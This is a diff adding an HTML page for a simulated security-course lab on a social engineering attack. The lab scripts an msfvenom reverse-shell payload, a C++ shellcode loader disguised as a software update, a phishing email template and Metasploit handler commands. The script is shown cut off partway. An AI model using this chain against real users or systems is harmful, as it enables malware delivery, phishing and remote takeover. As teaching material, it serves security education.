@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CIT-2640 :: Lab 1 — Social Engineering Attack</title>
+<style>
+  :root{
+    --bg:#0a0d0f;
+    --panel:#0f1417;
+    --panel2:#131a1e;
+    --line:#1e2a2e;
+    --red:#ff3344;
+    --red-dim:#7a1c26;
+    --cyan:#38f2e0;
+    --cyan-dim:#1a7d75;
+    --amber:#ffb020;
+    --amber-dim:#8a5f10;
+    --text:#d7e6e4;
+    --dim:#5c7a78;
+    --mono: 'Cascadia Code','Consolas','SFMono-Regular','Menlo','Courier New',monospace;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:var(--mono);}
+  body{
+    min-height:100vh;
+    background-image:
+      radial-gradient(ellipse at top left, rgba(56,242,224,0.05), transparent 45%),
+      radial-gradient(ellipse at bottom right, rgba(255,51,68,0.06), transparent 50%),
+      repeating-linear-gradient(0deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 3px);
+  }
+  a{color:var(--cyan);}
+  ::selection{background:var(--cyan-dim);color:#fff;}
+
+  /* ===== Top bar ===== */
+  .topbar{
+    position:sticky;top:0;z-index:50;
+    display:flex;align-items:center;justify-content:space-between;
+    padding:12px 22px;background:linear-gradient(180deg,#0c1113,#0a0d0f 90%);
+    border-bottom:1px solid var(--line);
+  }
+  .brand{display:flex;align-items:center;gap:12px;}
+  .brand .tag{
+    font-size:11px;letter-spacing:2px;color:var(--bg);background:var(--red);
+    padding:3px 8px;border-radius:2px;font-weight:700;
+  }
+  .brand .title{font-size:14px;letter-spacing:1px;color:var(--text);}
+  .brand .title b{color:var(--cyan);}
+  .scorechip{
+    display:flex;align-items:center;gap:10px;font-size:12px;color:var(--dim);
+  }
+  .scorechip .val{
+    font-size:16px;color:var(--amber);font-weight:700;border:1px solid var(--amber-dim);
+    padding:3px 10px;border-radius:3px;background:rgba(255,176,32,0.06);
+  }
+
+  /* ===== Progress rail ===== */
+  .rail{
+    display:flex;gap:6px;padding:10px 22px;background:var(--bg);
+    border-bottom:1px solid var(--line);overflow-x:auto;
+  }
+  .step{
+    flex:1;min-width:120px;display:flex;flex-direction:column;gap:4px;
+    padding:8px 10px;border:1px solid var(--line);border-radius:3px;background:var(--panel);
+    opacity:0.45;transition:.25s;
+  }
+  .step.active{opacity:1;border-color:var(--cyan-dim);box-shadow:0 0 0 1px var(--cyan-dim) inset;}
+  .step.done{opacity:1;border-color:var(--cyan-dim);}
+  .step .lbl{font-size:10px;letter-spacing:1.5px;color:var(--dim);text-transform:uppercase;}
+  .step .name{font-size:12px;color:var(--text);}
+  .step .pts{font-size:11px;color:var(--amber);}
+  .step.done .pts::after{content:" ✓";color:var(--cyan);}
+
+  main{max-width:960px;margin:0 auto;padding:26px 20px 90px;}
+  .panel{display:none;animation:fadein .35s ease;}
+  .panel.active{display:block;}
+  @keyframes fadein{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:none;}}
+
+  h1{font-size:20px;color:var(--text);letter-spacing:.5px;margin:0 0 4px;}
+  h2{font-size:15px;color:var(--cyan);letter-spacing:1px;text-transform:uppercase;margin:26px 0 10px;
+     border-bottom:1px solid var(--line);padding-bottom:6px;}
+  h3{font-size:13px;color:var(--amber);margin:16px 0 8px;}
+  p{line-height:1.6;font-size:13.5px;color:var(--text);}
+  .muted{color:var(--dim);font-size:12.5px;}
+
+  .card{
+    background:var(--panel);border:1px solid var(--line);border-radius:4px;padding:16px 18px;margin-bottom:14px;
+    border-top:2px solid var(--red-dim);
+  }
+  .card.cyan-top{border-top:2px solid var(--cyan-dim);}
+  .card.amber-top{border-top:2px solid var(--amber-dim);}
+
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+  @media(max-width:720px){.grid2{grid-template-columns:1fr;}}
+
+  table.topo{width:100%;border-collapse:collapse;font-size:12.5px;}
+  table.topo th,table.topo td{border:1px solid var(--line);padding:6px 10px;text-align:left;}
+  table.topo th{color:var(--dim);font-weight:600;background:var(--panel2);}
+  table.topo td{color:var(--text);}
+  table.topo .ip{color:var(--cyan);}
+
+  .warn{
+    display:flex;gap:10px;align-items:flex-start;background:rgba(255,51,68,0.06);
+    border:1px solid var(--red-dim);border-radius:4px;padding:10px 12px;font-size:12px;color:var(--text);margin:14px 0;
+  }
+  .warn b{color:var(--red);}
+  .info{
+    display:flex;gap:10px;align-items:flex-start;background:rgba(56,242,224,0.05);
+    border:1px solid var(--cyan-dim);border-radius:4px;padding:10px 12px;font-size:12px;color:var(--text);margin:14px 0;
+  }
+  .info b{color:var(--cyan);}
+
+  button{
+    font-family:var(--mono);cursor:pointer;border-radius:3px;border:1px solid var(--cyan-dim);
+    background:transparent;color:var(--cyan);padding:9px 16px;font-size:12.5px;letter-spacing:.5px;
+    transition:.15s;
+  }
+  button:hover:not(:disabled){background:var(--cyan-dim);color:#04211f;}
+  button:disabled{opacity:.35;cursor:not-allowed;}
+  button.primary{border-color:var(--red);color:var(--red);}
+  button.primary:hover:not(:disabled){background:var(--red);color:#1a0406;}
+  button.ghost{border-color:var(--line);color:var(--dim);}
+  .btnrow{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px;}
+
+  input[type=text],input[type=password],textarea{
+    width:100%;background:#0b1012;border:1px solid var(--line);color:var(--text);
+    font-family:var(--mono);font-size:13px;padding:9px 10px;border-radius:3px;outline:none;
+  }
+  input:focus,textarea:focus{border-color:var(--cyan-dim);}
+  label{display:block;font-size:11px;color:var(--dim);letter-spacing:1px;text-transform:uppercase;margin:10px 0 5px;}
+  textarea{min-height:90px;resize:vertical;}
+
+  /* ===== Terminal ===== */
+  .terminal{background:#060909;border:1px solid var(--line);border-radius:5px;overflow:hidden;margin:12px 0;}
+  .term-head{display:flex;align-items:center;gap:8px;padding:8px 12px;background:#0c1112;border-bottom:1px solid var(--line);}
+  .term-head .dot{width:9px;height:9px;border-radius:50%;}
+  .term-head .dot.r{background:#ff5f57;} .term-head .dot.y{background:#febc2e;} .term-head .dot.g{background:#28c840;}
+  .term-head .ttl{margin-left:8px;font-size:11px;color:var(--dim);}
+  .term-body{padding:12px 14px;font-size:12.5px;line-height:1.65;min-height:120px;max-height:340px;overflow-y:auto;}
+  .term-line{white-space:pre-wrap;word-break:break-word;}
+  .term-line.cmd{color:var(--text);}
+  .term-line.cmd .prompt{color:var(--cyan);}
+  .term-line.out{color:#8fb0ad;}
+  .term-line.ok{color:var(--cyan);}
+  .term-line.err{color:var(--red);}
+  .term-line.hint{color:var(--amber);}
+  .term-input-row{display:flex;align-items:center;gap:6px;padding:8px 14px 12px;border-top:1px solid var(--line);}
+  .term-input-row .prompt{color:var(--cyan);font-size:12.5px;white-space:nowrap;}
+  .term-input-row input{background:transparent;border:none;color:var(--text);font-family:var(--mono);
+    font-size:12.5px;flex:1;outline:none;}
+  .cursor{display:inline-block;width:7px;height:14px;background:var(--cyan);vertical-align:middle;animation:blink 1s steps(1) infinite;margin-left:2px;}
+  @keyframes blink{50%{opacity:0;}}
+
+  .checklist{list-style:none;padding:0;margin:10px 0;}
+  .checklist li{
+    display:flex;gap:8px;align-items:flex-start;font-size:12.5px;padding:5px 0;color:var(--dim);
+    border-bottom:1px dashed var(--line);
+  }
+  .checklist li:last-child{border-bottom:none;}
+  .checklist li.done{color:var(--text);}
+  .checklist li .box{width:14px;height:14px;border:1px solid var(--dim);border-radius:2px;flex-shrink:0;margin-top:2px;}
+  .checklist li.done .box{background:var(--cyan-dim);border-color:var(--cyan);position:relative;}
+  .checklist li.done .box::after{content:"✓";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:10px;color:#04211f;}
+
+  .taskscore{
+    display:inline-block;font-size:11px;color:var(--amber);border:1px solid var(--amber-dim);
+    padding:3px 9px;border-radius:3px;background:rgba(255,176,32,0.06);margin-left:8px;
+  }
+
+  /* Webmail mock */
+  .mailwrap{border:1px solid var(--line);border-radius:5px;overflow:hidden;background:#0c1214;}
+  .mailhead{background:#101a1c;padding:8px 14px;font-size:11px;color:var(--dim);border-bottom:1px solid var(--line);
+    display:flex;justify-content:space-between;}
+  .mailbody{padding:16px;}
+  .field-ok{border-color:var(--cyan-dim) !important;}
+  .field-err{border-color:var(--red) !important;}
+  .helptext{font-size:11px;color:var(--dim);margin-top:4px;}
+  .helptext.err{color:var(--red);}
+  .helptext.ok{color:var(--cyan);}
+  .linkpill{
+    display:inline-flex;align-items:center;gap:6px;background:rgba(56,242,224,0.08);border:1px solid var(--cyan-dim);
+    color:var(--cyan);border-radius:20px;padding:4px 10px;font-size:11.5px;margin-top:6px;
+  }
+
+  /* Victim sim buttons */
+  .vsteps{display:flex;flex-direction:column;gap:8px;margin-top:10px;}
+  .vstep{
+    display:flex;justify-content:space-between;align-items:center;gap:10px;
+    border:1px solid var(--line);border-radius:4px;padding:10px 12px;background:var(--panel2);
+  }
+  .vstep .desc{font-size:12.5px;color:var(--text);}
+  .vstep.done{border-color:var(--cyan-dim);}
+  .vstep.done .desc{color:var(--dim);}
+  .vstep.done .desc::before{content:"✓ ";color:var(--cyan);}
+
+  /* Completion */
+  .stamp{
+    text-align:center;padding:28px 18px;border:2px solid var(--red);border-radius:6px;
+    background:repeating-linear-gradient(135deg, rgba(255,51,68,0.04) 0 10px, transparent 10px 20px);
+    margin:18px 0;
+  }
+  .stamp .big{font-size:28px;letter-spacing:4px;color:var(--red);font-weight:800;}
+  .stamp .sub{font-size:12px;color:var(--dim);margin-top:6px;letter-spacing:1px;}
+  .certfield{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13px;}
+  .certfield b{color:var(--cyan);}
+  .breakdown{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:14px 0;}
+  .bd-item{border:1px solid var(--line);border-radius:4px;padding:12px;text-align:center;background:var(--panel2);}
+  .bd-item .num{font-size:22px;color:var(--amber);font-weight:700;}
+  .bd-item .lbl{font-size:10.5px;color:var(--dim);letter-spacing:1px;text-transform:uppercase;margin-top:4px;}
+  @media(max-width:640px){.breakdown{grid-template-columns:1fr;}}
+
+  footer.hint-bar{
+    position:fixed;bottom:0;left:0;right:0;background:#0a0d0f;border-top:1px solid var(--line);
+    padding:8px 20px;font-size:11px;color:var(--dim);text-align:center;
+  }
+  code.k{background:#101a1c;border:1px solid var(--line);border-radius:3px;padding:1px 6px;color:var(--cyan);}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="brand">
+    <span class="tag">CIT-2640</span>
+    <span class="title">Module 1 Lab &middot; <b>Social Engineering Attack</b></span>
+  </div>
+  <div class="scorechip">
+    <span>SCORE</span>
+    <span class="val"><span id="scoreNow">0</span> / 15</span>
+  </div>
+</div>
+
+<div class="rail" id="rail">
+  <div class="step active" data-panel="intro"><span class="lbl">Briefing</span><span class="name">Lab Overview</span><span class="pts">&nbsp;</span></div>
+  <div class="step" data-panel="task1"><span class="lbl">Task 1</span><span class="name">Build update.exe</span><span class="pts" id="pts1">0 / 5 pts</span></div>
+  <div class="step" data-panel="task2"><span class="lbl">Task 2</span><span class="name">Craft the Email</span><span class="pts" id="pts2">0 / 5 pts</span></div>
+  <div class="step" data-panel="task3"><span class="lbl">Task 3</span><span class="name">Gain Control</span><span class="pts" id="pts3">0 / 5 pts</span></div>
+  <div class="step" data-panel="complete"><span class="lbl">Final</span><span class="name">Lab Completed</span><span class="pts">&nbsp;</span></div>
+</div>
+
+<main>
+
+<!-- ============ INTRO ============ -->
+<section class="panel active" id="intro">
+  <h1>Lab 1 — Social Engineering Attack</h1>
+  <p class="muted">Aligned to CompTIA Security+ (SY0-601) 1.1 &amp; 1.2 &middot; 15 points graded &middot; Simulation environment</p>
+
+  <div class="warn">
+    <b>SIMULATION NOTICE:</b>
+    <span>Every command, file, email, and system in this lab is scripted for instruction. No real executable is generated, no real network traffic occurs, and no real system is affected. Treat every terminal, inbox, and machine below as a mock of the isolated NETLAB+ topology described in the source courseware.</span>
+  </div>
+
+  <h2>Objectives</h2>
+  <div class="grid2">
+    <div class="card">
+      <h3>What you'll do</h3>
+      <ul style="font-size:13px;line-height:1.8;margin:0;padding-left:18px;">
+        <li>Build a malicious EXE file</li>
+        <li>Experience a social engineering attack</li>
+        <li>Attack a target machine in a hidden network</li>
+      </ul>
+    </div>
+    <div class="card cyan-top">
+      <h3>Grading — 15 points</h3>
+      <ul style="font-size:13px;line-height:1.8;margin:0;padding-left:18px;">
+        <li>Task 1 — Build <code class="k">update.exe</code> &nbsp;(5 pts)</li>
+        <li>Task 2 — Craft the phishing email &nbsp;(5 pts)</li>
+        <li>Task 3 — Gain control of the victim &nbsp;(5 pts)</li>
+      </ul>
+    </div>
+  </div>
+
+  <h2>Lab Topology (simulated)</h2>
+  <table class="topo">
+    <tr><th>Machine</th><th>Role</th><th>IP Address</th><th>Account</th></tr>
+    <tr><td>Kali</td><td>Attacker workstation</td><td class="ip">203.0.113.2</td><td>kali / kali</td></tr>
+    <tr><td>pfSense</td><td>Firewall — WAN ⇄ DMZ ⇄ LAN</td><td class="ip">192.168.0.1</td><td>sysadmin</td></tr>
+    <tr><td>UbuntuSRV</td><td>Mail server (DMZ)</td><td class="ip">172.16.1.10</td><td>sysadmin</td></tr>
+    <tr><td>WinOS</td><td>Victim workstation (hidden LAN)</td><td class="ip">192.168.0.50</td><td>lab-user (Will Smith)</td></tr>
+  </table>
+  <p class="muted" style="margin-top:8px;">The WAN (internet) cannot initiate a connection into the LAN. The attacker's path in is a <b style="color:var(--amber)">compromised mail account</b> — not a network exploit. That's the whole lesson.</p>
+
+  <div class="info"><b>How grading works:</b> <span>Each task is a self-contained simulation. Type the requested commands or fill the requested fields exactly as instructed — the system checks your input and awards points live. Your progress bar above tracks your running score out of 15.</span></div>
+
+  <div class="btnrow">
+    <button class="primary" onclick="goTo('task1')">Begin Task 1 →</button>
+  </div>
+</section>
+
+<!-- ============ TASK 1 ============ -->
+<section class="panel" id="task1">
+  <h1>Task 1 — Build the Malicious Windows Executable <span class="taskscore" id="t1score">0 / 5</span></h1>
+  <p>You are logged into <b style="color:var(--cyan)">Kali</b> as <code class="k">kali</code>. A partially-built payload wrapper, <code class="k">main.cpp</code>, is already sitting in your Documents folder. Use <code class="k">msfvenom</code> to generate shellcode, splice it into the source, compile it into <code class="k">update.exe</code>, then password-protect it in a zip so it survives download.</p>
+
+  <div class="terminal">
+    <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="ttl">kali@kali: ~/Documents</span></div>
+    <div class="term-body" id="t1-body"></div>
+    <div class="term-input-row">
+      <span class="prompt">kali@kali$</span>
+      <input type="text" id="t1-input" placeholder="type a command and press Enter" autocomplete="off">
+    </div>
+  </div>
+
+  <h3>Checklist</h3>
+  <ul class="checklist" id="t1-checklist">
+    <li data-step="0"><span class="box"></span><span>Move into the Documents directory — <code class="k">cd Documents</code></span></li>
+    <li data-step="1"><span class="box"></span><span>Inspect the payload wrapper — <code class="k">cat main.cpp</code></span></li>
+    <li data-step="2"><span class="box"></span><span>Generate the reverse-shell payload with <code class="k">msfvenom</code> (LHOST=203.0.113.2, LPORT=4444, format C)</span></li>
+    <li data-step="3"><span class="box"></span><span>Cross-compile to a Windows PE — <code class="k">x86_64-w64-mingw32-g++ main.cpp -o update.exe</code></span></li>
+    <li data-step="4"><span class="box"></span><span>Zip and password-protect the executable — <code class="k">zip -e update.zip update.exe</code></span></li>
+  </ul>
+
+  <div class="btnrow">
+    <button class="ghost" onclick="t1Hint()">Show hint for current step</button>
+    <button id="t1-next" class="primary" disabled onclick="goTo('task2')">Continue to Task 2 →</button>
+  </div>
+</section>
+
+<!-- ============ TASK 2 ============ -->
+<section class="panel" id="task2">
+  <h1>Task 2 — Craft the Social Engineering Email <span class="taskscore" id="t2score">0 / 5</span></h1>
+  <p>The DMZ mail server hosts webmail for <b>everyone on the LAN</b> — including a compromised account, <code class="k">tech@mail.netlab.local</code>. You'll use it to reach a target the internet normally can't touch: <b style="color:var(--amber)">wsmith@mail.netlab.local</b> (Will Smith, our victim), sitting on the hidden 192.168.0.0/24 network.</p>
+
+  <div class="mailwrap" id="mail-login-block">
+    <div class="mailhead"><span>Roundcube Webmail — http://172.16.1.10/mail</span><span>SIMULATED</span></div>
+    <div class="mailbody">
+      <label>Username</label>
+      <input type="text" id="mailUser" placeholder="compromised account address">
+      <label>Password</label>
+      <input type="password" id="mailPass" placeholder="password">
+      <div class="helptext" id="loginHelp">Hint: this is the compromised tech account, not the victim's.</div>
+      <div class="btnrow"><button class="primary" onclick="checkLogin()">Log In</button></div>
+    </div>
+  </div>
+
+  <div class="mailwrap" id="mail-compose-block" style="display:none;">
+    <div class="mailhead"><span>Compose — signed in as tech@mail.netlab.local</span><span>SIMULATED</span></div>
+    <div class="mailbody">
+      <label>To</label>
+      <input type="text" id="mailTo" placeholder="victim's email address" onblur="checkTo()">
+      <div class="helptext" id="toHelp"></div>
+
+      <label>Subject</label>
+      <input type="text" id="mailSubject" placeholder="a believable subject line" onblur="checkSubject()">
+      <div class="helptext" id="subjHelp"></div>
+
+      <label>Message body</label>
+      <textarea id="mailBody">Hello,
+
+Our records show your workstation is out of date. Please click HERE to download and run the latest security update.
+
+IT Support</textarea>
+      <div class="helptext">The word <b style="color:var(--amber)">HERE</b> needs to become a hyperlink to your hosted payload.</div>
+
+      <div class="btnrow">
+        <button onclick="openLinkModal()">Insert / Edit Link on "HERE"</button>
+      </div>
+      <div id="linkStatus"></div>
+
+      <div class="btnrow">
+        <button class="primary" id="sendBtn" disabled onclick="sendMail()">Send</button>
+      </div>
+      <div class="helptext" id="sendHelp"></div>
+    </div>
+  </div>
+
+  <!-- link modal -->
+  <div id="linkModal" style="display:none;" class="mailwrap">
+    <div class="mailhead"><span>Insert Link</span><span></span></div>
+    <div class="mailbody">
+      <label>URL</label>
+      <input type="text" id="linkUrl" placeholder="http://203.0.113.2:8000/update.zip">
+      <div class="helptext">This should point at the file you hosted with <code class="k">python3 -m http.server</code> in Task 1.</div>
+      <div class="btnrow">
+        <button class="primary" onclick="confirmLink()">OK</button>
+        <button class="ghost" onclick="closeLinkModal()">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="btnrow">
+    <button id="t2-next" class="primary" disabled onclick="goTo('task3')">Continue to Task 3 →</button>
+  </div>
+</section>
+
+<!-- ============ TASK 3 ============ -->
+<section class="panel" id="task3">
+  <h1>Task 3 — Gain Control of the Victim Machine <span class="taskscore" id="t3score">0 / 5</span></h1>
+  <p>First, stand up a listener on Kali with <code class="k">msfconsole</code> so you're ready to catch the callback. Then switch to the victim's point of view and simulate Will Smith opening your email.</p>
+
+  <h3>3a &middot; Metasploit Handler (4 pts)</h3>
+  <div class="terminal">
+    <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="ttl">kali@kali: msfconsole</span></div>
+    <div class="term-body" id="t3-body"></div>
+    <div class="term-input-row">
+      <span class="prompt" id="t3-prompt">msf6&gt;</span>
+      <input type="text" id="t3-input" placeholder="type a metasploit command and press Enter" autocomplete="off">
+    </div>
+  </div>
+  <ul class="checklist" id="t3-checklist">
+    <li data-step="0"><span class="box"></span><span>Select the handler module — <code class="k">use exploit/multi/handler</code></span></li>
+    <li data-step="1"><span class="box"></span><span>Match the payload — <code class="k">set payload windows/x64/shell_reverse_tcp</code></span></li>
+    <li data-step="2"><span class="box"></span><span>Point it at your Kali box — <code class="k">set LHOST 203.0.113.2</code></span></li>
+    <li data-step="3"><span class="box"></span><span>Start listening — <code class="k">exploit</code></span></li>
+  </ul>
+
+  <h3>3b &middot; Victim Workstation — WinOS (1 pt)</h3>
+  <p class="muted">Simulating Will Smith's session on the hidden LAN machine. Click through each step in order.</p>
+  <div class="vsteps" id="vsteps">
+    <div class="vstep" data-v="0"><span class="desc">Log in to WinOS as netlab\lab-user</span><button onclick="vStep(0)">Do it</button></div>
+    <div class="vstep" data-v="1"><span class="desc">Open Edge → webmail → sign in as wsmith@mail.netlab.local</span><button onclick="vStep(1)" disabled>Do it</button></div>
+    <div class="vstep" data-v="2"><span class="desc">Open the "Please update your software" email and click HERE</span><button onclick="vStep(2)" disabled>Do it</button></div>
+    <div class="vstep" data-v="3"><span class="desc">Keep the download despite the SmartScreen warning</span><button onclick="vStep(3)" disabled>Do it</button></div>
+    <div class="vstep" data-v="4" id="vstep4"><span class="desc">Open update.zip — enter password</span><button onclick="vStep(4)" disabled>Unlock</button></div>
+    <div class="vstep" data-v="5"><span class="desc">Run update.exe ("More info" → "Run anyway")</span><button onclick="vStep(5)" disabled>Run it</button></div>
+  </div>
+  <div id="zipPassRow" style="display:none;margin-top:8px;">
+    <label>Zip password (set back in Task 1)</label>
+    <input type="password" id="zipPassInput" placeholder="password">
+    <div class="helptext" id="zipHelp"></div>
+    <div class="btnrow"><button class="primary" onclick="checkZipPass()">Confirm</button></div>
+  </div>
+
+  <div class="btnrow">
+    <button id="t3-next" class="primary" disabled onclick="goTo('complete')">Finish Lab →</button>
+  </div>
+</section>
+
+<!-- ============ COMPLETE ============ -->
+<section class="panel" id="complete">
+  <h1>Lab Completed</h1>
+  <div class="stamp">
+    <div class="big">ACCESS GRANTED</div>
+    <div class="sub">Session established on 192.168.0.50 via social engineering</div>
+  </div>
+
+  <div class="breakdown">
+    <div class="bd-item"><div class="num" id="bd1">0/5</div><div class="lbl">Task 1<br>Build EXE</div></div>
+    <div class="bd-item"><div class="num" id="bd2">0/5</div><div class="lbl">Task 2<br>Craft Email</div></div>
+    <div class="bd-item"><div class="num" id="bd3">0/5</div><div class="lbl">Task 3<br>Gain Control</div></div>
+  </div>
+
+  <div class="card cyan-top">
+    <label>Student Name</label>
+    <input type="text" id="studentName" placeholder="Enter your full name" oninput="renderCert()">
+
+    <div style="margin-top:16px;">
+      <div class="certfield"><span>Course</span><b>CIT-2640 — Network Security</b></div>
+      <div class="certfield"><span>Assignment</span><b>Module 1 Lab — Social Engineering Attack</b></div>
+      <div class="certfield"><span>Student</span><b id="certName">—</b></div>
+      <div class="certfield"><span>Date / Time Completed</span><b id="certDate">—</b></div>
+      <div class="certfield"><span>Final Score</span><b id="certScore" style="color:var(--red);">0 / 15</b></div>
+    </div>
+  </div>
+
+  <div class="btnrow">
+    <button class="primary" onclick="window.print()">Print / Save Record</button>
+    <button class="ghost" onclick="goTo('intro')">Review Lab Again</button>
+  </div>
+</section>
+
+</main>
+
+<footer class="hint-bar">Everything on this page is simulated for instruction — no real files, payloads, or network connections are created. &middot; CIT-2640 Module 1</footer>
+
+<script>
+/* ================= State ================= */
+const state = {
+  t1: 0, t2: 0, t3: 0,
+  completedAt: null
+};
+
+function totalScore(){ return state.t1 + state.t2 + state.t3; }
+
+function refreshScore(){
+  document.getElementById('scoreNow').textContent = totalScore();
+  document.getElementById('pts1').textContent = state.t1 + ' / 5 pts';
+  document.getElementById('pts2').textContent = state.t2 + ' / 5 pts';
+  document.getElementById('pts3').textContent = state.t3 + ' / 5 pts';
+  document.getElementById('t1score').textContent = state.t1 + ' / 5';
+  document.getElementById('t2score').textContent = state.t2 + ' / 5';
+  document.getElementById('t3score').textContent = state.t3 + ' / 5';
+  document.getElementById('bd1').textContent = state.t1 + '/5';
+  document.getElementById('bd2').textContent = state.t2 + '/5';
+  document.getElementById('bd3').textContent = state.t3 + '/5';
+
+  document.querySelector('.step[data-panel="task1"]').classList.toggle('done', state.t1 >= 5);
+  document.querySelector('.step[data-panel="task2"]').classList.toggle('done', state.t2 >= 5);
+  document.querySelector('.step[data-panel="task3"]').classList.toggle('done', state.t3 >= 5);
+
+  document.getElementById('t1-next').disabled = state.t1 < 5;
+  document.getElementById('t2-next').disabled = state.t2 < 5;
+  document.getElementById('t3-next').disabled = state.t3 < 5;
+}
+
+function goTo(panelId){
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.getElementById(panelId).classList.add('active');
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  const railStep = document.querySelector('.step[data-panel="'+panelId+'"]');
+  if(railStep) railStep.classList.add('active');
+  window.scrollTo({top:0, behavior:'smooth'});
+  if(panelId === 'complete'){
+    state.completedAt = new Date();
+    renderCert();
+  }
+}
+
+function normalize(s){ return s.trim().replace(/\s+/g,' ').toLowerCase(); }
+
+/* ================= TASK 1 : terminal ================= */
+const t1Body = document.getElementById('t1-body');
+const t1Input = document.getElementById('t1-input');
+let t1Idx = 0;
+
+const t1Steps = [
+  {
+    match: c => /^cd\s+documents\/?$/.test(c),
+    out: [],
+    hint: 'Type: cd Documents'
+  },
+  {
+    match: c => /^cat\s+main\.cpp$/.test(c),
+    out: [
+      '#include <windows.h>',
+      'unsigned char payload[] = ',
+      '"PASTE_PAYLOAD_HERE";',
+      '',
+      'int main(){',
+      '  printf("Checking for updates...\\n");',
+      '  ((void(*)())payload)();',
+      '  return 0;',
+      '}'
+    ],
+    hint: 'Type: cat main.cpp'
+  },
+  {
+    match: c => c.includes('msfvenom') && c.includes('windows/x64/shell_reverse_tcp') &&
+                c.includes('lhost=203.0.113.2') && c.includes('lport=4444') && c.includes('-f c'),
+    out: [
+      '[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload',
+      '[-] No arch selected, selecting arch: x64 from the payload',
+      'No encoder specified, outputting raw payload',
+      'Payload size: 460 bytes',
+      'Final size of c file: 2003 bytes',
+      'unsigned char buf[] = ',
+      '"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41..."'
+    ],
+    hint: 'Type: msfvenom -p windows/x64/shell_reverse_tcp LHOST=203.0.113.2 LPORT=4444 -f c'
+  },
+  {
+    match: c => c.includes('x86_64-w64-mingw32-g++') && c.includes('main.cpp') && c.includes('-o') && c.includes('update.exe'),
+    out: ['(compiling...)', 'update.exe generated.'],
+    hint: 'Type: x86_64-w64-mingw32-g++ main.cpp -o update.exe'
+  },
+  {
+    match: c => c.includes('zip') && c.includes('-e') && c.includes('update.zip') && c.includes('update.exe'),
+    out: ['Enter password: '],
+    hint: 'Type: zip -e update.zip update.exe',
+    passwordFollowup: true
+  }
+];
+
+function t1Print(text, cls){
+  const div = document.createElement('div');
+  div.className = 'term-line ' + (cls||'out');
+  div.textContent = text;
+  t1Body.appendChild(div);
+  t1Body.scrollTop = t1Body.scrollHeight;
+}
+function t1PrintCmd(text){
+  const div = document.createElement('div');
+  div.className = 'term-line cmd';
+  div.innerHTML = '<span class="prompt">kali@kali$</span> ' + text;
+  t1Body.appendChild(div);
+  t1Body.scrollTop = t1Body.scrollHeight;
+}
+
+t1Print('Welcome to Kali Linux — Documents folder contains a partial payload wrapper (main.cpp).', 'out');
+t1Print('Type each command from the checklist below and press Enter.', 'hint');
+
+let awaitingZipPassword = false, zipPassStage = 0, zipPassword = null;
+
+t1Input.addEventListener('keydown', (e) => {
+  if(e.key !== 'Enter') return;
+  const raw = t1Input.value;
+  const cmd = normalize(raw);
+  if(!cmd) return;
+
+  if(awaitingZipPassword){
+    if(zipPassStage === 0){
+      zipPassword = raw.trim();
+      t1PrintCmd('*'.repeat(raw.trim().length));
+      t1Print('Verify password: ', 'out');
+      zipPassStage = 1;
+    } else {
+      t1PrintCmd('*'.repeat(raw.trim().length));
+      if(raw.trim() === zipPassword && zipPassword.length > 0){
+        t1Print('  adding: update.exe (deflated 61%)', 'out');
+        t1Print('update.zip created and encrypted. ✔ Step complete.', 'ok');
+        markT1Step(4, true);
+        window.LAB_ZIP_PASSWORD = zipPassword;
+        awaitingZipPassword = false;
+      } else {
+        t1Print('zip warning: password verify failed — passwords did not match. Try the zip command again.', 'err');
+        awaitingZipPassword = false;
+      }
+    }
+    t1Input.value = '';
+    return;
+  }
+
+  t1PrintCmd(raw);
+  const step = t1Steps[t1Idx];
+
+  if(!step){
+    t1Print('(all steps complete)', 'out');
+    t1Input.value = '';
+    return;
+  }
+
+  if(step.match(cmd)){
+    step.out.forEach(line => t1Print(line, 'out'));
+    if(step.passwordFollowup){
+      awaitingZipPassword = true;
+      zipPassStage = 0;
+    } else {
+      t1Print('✔ Step complete.', 'ok');
+      markT1Step(t1Idx, true);
+      t1Idx++;
+    }
+  } else {
+    t1Print('command not recognized in this context — try again.', 'err');
+    t1Print('Hint: ' + step.hint, 'hint');
+  }
+  t1Input.value = '';
+});
+
+function markT1Step(i, done){
+  const li = document.querySelector('#t1-checklist li[data-step="'+i+'"]');
+  if(li) li.classList.toggle('done', done);
+  if(done) state.t1 = Math.min(5, state.t1 + 1);
+  refreshScore();
+}
+
+function t1Hint(){
+  const step = t1Steps[t1Idx];
+  if(step) t1Print('Hint: ' + step.hint, 'hint');
+  else t1Print('All Task 1 steps are already complete — continue to Task 2.', 'hint');
+}
+
+/* ================= TASK 2 : webmail ================= */
+let mailState = { loggedIn:false, toOk:false, subjOk:false, linkOk:false };
+
+function checkLogin(){
+  const u = normalize(document.getElementById('mailUser').value);
+  const p = document.getElementById('mailPass').value.trim();
+  const help = document.getElementById('loginHelp');
+  if(u === 'tech@mail.netlab.local' && p === 'Train1ng$'){
+    help.textContent = 'Signed in.';
+    help.className = 'helptext ok';
+    document.getElementById('mail-login-block').style.display = 'none';
+    document.getElementById('mail-compose-block').style.display = 'block';
+  } else {
+    help.textContent = 'Incorrect. Use the compromised account: tech@mail.netlab.local / Train1ng$';
+    help.className = 'helptext err';
+  }
+}
+
+function checkTo(){
+  const v = normalize(document.getElementById('mailTo').value);
+  const help = document.getElementById('toHelp');
+  const ok = v.includes('wsmith') && v.includes('mail.netlab.local');
+  mailState.toOk = ok;
